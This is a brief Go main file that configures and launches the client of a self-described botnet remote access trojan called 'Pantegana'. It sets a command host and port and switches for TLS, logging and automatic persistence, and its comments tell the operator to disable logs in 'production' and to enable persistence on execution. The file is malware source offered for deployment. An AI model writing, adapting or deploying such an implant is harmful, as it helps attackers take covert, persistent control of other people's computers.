package main

import (
	client "github.com/elleven11/pantegana/client"
)

func main() {

	cfg := client.ClientConfig{
		Name:        "Pantegana",         // Used for persistence
		DisplayName: "Just a Botnet RAT", // Used for persistence
		Host:        "127.0.0.1",
		Port:        1337,
		HasTLS:      true,  // for debug only
		HasLogs:     true,  // disable this in "production"
		AutoPersist: false, // enable for persistence on execution
	}

	client.RunClient(&cfg)
}
